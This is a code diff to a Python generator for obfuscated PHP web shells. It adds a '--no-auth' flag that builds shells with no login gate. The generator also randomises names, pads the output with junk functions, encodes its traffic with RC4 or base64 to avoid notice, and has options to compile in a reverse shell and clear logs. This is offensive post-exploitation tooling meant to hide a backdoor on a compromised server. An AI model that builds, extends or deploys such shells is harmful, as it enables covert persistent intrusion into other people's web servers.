@@ -581,7 +581,7 @@ def pick(pool, used, rng):
 def build_php_section(n, jv, ids, route_param, routes, session_key_val,
                       bcrypt_hash, username, junk_before, junk_after,
                       case_order, theme, ver, rng,
-                      transport, transport_ctx, features):
+                      transport, transport_ctx, features, no_auth=False):
     if theme == 'poly':
         T = generate_poly_theme(rng)
     elif theme == 'none':
@@ -888,6 +888,95 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     title_str = T['app_name']
     ver_str   = T['version_prefix'] + ver
 
+    # ── Auth block (session + login gate, or empty for --no-auth) ──
+    if no_auth:
+        auth_block = ""
+    else:
+        auth_block = f"""session_start(['cookie_httponly' => true, 'use_strict_mode' => true, 'cookie_samesite' => 'Lax']);
+
+define('{n['sess_const']}', '{session_key_val}');
+define('{n['user_const']}', '{username}');
+define('{n['hash_const']}', '{bcrypt_hash}');
+
+function {n['is_session']}(): bool {{
+    return isset($_SESSION[{n['sess_const']}]) && $_SESSION[{n['sess_const']}] === true;
+}}
+
+function {n['start_session']}(): void {{
+    $_SESSION[{n['sess_const']}] = true;
+}}
+
+function {n['safe_cmp']}($a, $b): bool {{
+    return hash_equals($a, $b);
+}}
+
+function {n['check_creds']}(string $login, string $password): bool {{
+    return {n['safe_cmp']}($login, {n['user_const']}) && password_verify($password, {n['hash_const']});
+}}
+
+if (!{n['is_session']}()) {{
+    $__err = false;
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'], $_POST['password'])) {{
+        if ({n['check_creds']}($_POST['login'], $_POST['password'])) {{
+            {n['start_session']}();
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        }} else {{
+            $__err = true;
+            usleep(random_int(400000, 700000));
+        }}
+    }}
+    header('Content-Type: text/html; charset=utf-8');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title><?= htmlspecialchars('{title_str}') ?> - Access</title>
+  <style>
+    body {{ background: {T['body_bg']}; color: {T['body_fg']}; font-family: monospace;
+           display: flex; align-items: center; justify-content: center;
+           height: 100vh; margin: 0; }}
+    .auth-form {{ background: {T['form_bg']}; padding: 20px;
+                  border: 1px solid {T['form_border']};
+                  box-shadow: 0 0 12px rgba(0,0,0,.3);
+                  border-radius: 6px; width: 280px; }}
+    .auth-form input {{ width: 100%; padding: 8px; margin: 10px 0;
+                        background: {T['input_bg']}; border: 1px solid {T['input_border']};
+                        color: {T['input_fg2']}; font-family: monospace;
+                        box-sizing: border-box; }}
+    .auth-form button {{ padding: 8px 14px; background: {T['btn_bg']};
+                         color: {T['btn_fg']}; font-weight: bold;
+                         border: none; cursor: pointer; width: 100%; }}
+    .auth-form h3 {{ margin: 0 0 10px; }}
+    .auth-note {{ font-size: 10px; color: {T['note_fg']}; margin-top: 8px; }}
+    .auth-error {{ color: {T['error_fg']}; font-size: 11px; margin-top: -6px;
+                   transition: opacity .3s ease-in-out; }}
+  </style>
+  <script>
+    window.addEventListener("DOMContentLoaded", function() {{
+      var e = document.querySelector('.auth-error');
+      if (e) setTimeout(function() {{ e.style.opacity = 0; }}, Math.floor(Math.random()*3000)+2000);
+    }});
+  </script>
+</head>
+<body>
+  <form class="auth-form" method="POST">
+    <h3>{title_str} {ver_str}</h3>
+    <input type="text" name="login" placeholder="Username" required autofocus />
+    <input type="password" name="password" placeholder="Password" required />
+    <?php if ($__err): ?>
+      <div class="auth-error">Invalid username or password.</div>
+    <?php endif; ?>
+    <button type="submit"><?php echo $__err ? "Retry" : "Access"; ?></button>
+    <div class="auth-note">Authentication required.</div>
+  </form>
+</body>
+</html>
+<?php
+    exit;
+}}"""
+
     # ── CSS ──
     css = f"""
     :root {{
@@ -1123,90 +1212,7 @@ function {n['get_env_info']}() {{
 
 {junk_after_str}
 
-session_start(['cookie_httponly' => true, 'use_strict_mode' => true, 'cookie_samesite' => 'Lax']);
-
-define('{n['sess_const']}', '{session_key_val}');
-define('{n['user_const']}', '{username}');
-define('{n['hash_const']}', '{bcrypt_hash}');
-
-function {n['is_session']}(): bool {{
-    return isset($_SESSION[{n['sess_const']}]) && $_SESSION[{n['sess_const']}] === true;
-}}
-
-function {n['start_session']}(): void {{
-    $_SESSION[{n['sess_const']}] = true;
-}}
-
-function {n['safe_cmp']}($a, $b): bool {{
-    return hash_equals($a, $b);
-}}
-
-function {n['check_creds']}(string $login, string $password): bool {{
-    return {n['safe_cmp']}($login, {n['user_const']}) && password_verify($password, {n['hash_const']});
-}}
-
-if (!{n['is_session']}()) {{
-    $__err = false;
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'], $_POST['password'])) {{
-        if ({n['check_creds']}($_POST['login'], $_POST['password'])) {{
-            {n['start_session']}();
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit;
-        }} else {{
-            $__err = true;
-            usleep(random_int(400000, 700000));
-        }}
-    }}
-    header('Content-Type: text/html; charset=utf-8');
-?>
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title><?= htmlspecialchars('{title_str}') ?> - Access</title>
-  <style>
-    body {{ background: {T['body_bg']}; color: {T['body_fg']}; font-family: monospace;
-           display: flex; align-items: center; justify-content: center;
-           height: 100vh; margin: 0; }}
-    .auth-form {{ background: {T['form_bg']}; padding: 20px;
-                  border: 1px solid {T['form_border']};
-                  box-shadow: 0 0 12px rgba(0,0,0,.3);
-                  border-radius: 6px; width: 280px; }}
-    .auth-form input {{ width: 100%; padding: 8px; margin: 10px 0;
-                        background: {T['input_bg']}; border: 1px solid {T['input_border']};
-                        color: {T['input_fg2']}; font-family: monospace;
-                        box-sizing: border-box; }}
-    .auth-form button {{ padding: 8px 14px; background: {T['btn_bg']};
-                         color: {T['btn_fg']}; font-weight: bold;
-                         border: none; cursor: pointer; width: 100%; }}
-    .auth-form h3 {{ margin: 0 0 10px; }}
-    .auth-note {{ font-size: 10px; color: {T['note_fg']}; margin-top: 8px; }}
-    .auth-error {{ color: {T['error_fg']}; font-size: 11px; margin-top: -6px;
-                   transition: opacity .3s ease-in-out; }}
-  </style>
-  <script>
-    window.addEventListener("DOMContentLoaded", function() {{
-      var e = document.querySelector('.auth-error');
-      if (e) setTimeout(function() {{ e.style.opacity = 0; }}, Math.floor(Math.random()*3000)+2000);
-    }});
-  </script>
-</head>
-<body>
-  <form class="auth-form" method="POST">
-    <h3>{title_str} {ver_str}</h3>
-    <input type="text" name="login" placeholder="Username" required autofocus />
-    <input type="password" name="password" placeholder="Password" required />
-    <?php if ($__err): ?>
-      <div class="auth-error">Invalid username or password.</div>
-    <?php endif; ?>
-    <button type="submit"><?php echo $__err ? "Retry" : "Access"; ?></button>
-    <div class="auth-note">Authentication required.</div>
-  </form>
-</body>
-</html>
-<?php
-    exit;
-}}
+{auth_block}
 
 {php_transport_inject}
 if (isset($_GET['{route_param}'])) {{
@@ -1553,14 +1559,17 @@ def generate(args):
     }
     session_key_val = rnd_token(rng, 14)
 
-    # bcrypt hash via PHP subprocess
-    print(f"[*] Computing bcrypt hash (cost=12)...", end=' ', flush=True)
-    bcrypt_hash = compute_bcrypt_hash(args.password, seed=args.seed)
-    if bcrypt_hash:
-        print(f"OK ({bcrypt_hash[:20]}...)")
+    # bcrypt hash via PHP subprocess (skipped in --no-auth mode)
+    if args.no_auth:
+        bcrypt_hash = ''
     else:
-        bcrypt_hash = args.password.encode().hex()
-        print("FALLBACK hex (php not found)")
+        print(f"[*] Computing bcrypt hash (cost=12)...", end=' ', flush=True)
+        bcrypt_hash = compute_bcrypt_hash(args.password, seed=args.seed)
+        if bcrypt_hash:
+            print(f"OK ({bcrypt_hash[:20]}...)")
+        else:
+            bcrypt_hash = args.password.encode().hex()
+            print("FALLBACK hex (php not found)")
 
     used_php = set()
     # PHP core names
@@ -1633,7 +1642,8 @@ def generate(args):
         n, jv, ids, route_param, routes, session_key_val,
         bcrypt_hash, args.user, junk_before, junk_after,
         case_order, theme, ver, rng,
-        args.transport, transport_ctx, features
+        args.transport, transport_ctx, features,
+        no_auth=args.no_auth,
     )
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1672,6 +1682,8 @@ Examples:
                         help='Disable junk function generation')
     parser.add_argument('--transport', choices=['plain','mimic','rc4'], default='plain',
                         help='AJAX traffic encoding — plain: no encoding (default); mimic: standard base64 with random param names; rc4: RC4 + per-build shuffled base64 alphabet')
+    parser.add_argument('--no-auth', action='store_true', default=False,
+                        help='Generate shell without authentication (no login form, no session, no bcrypt — direct access)')
     parser.add_argument('--revshell', action='store_true', default=False,
                         help='Compile revshell command into the shell (opt-in; not included by default)')
     parser.add_argument('--clearlog', action='store_true', default=False,
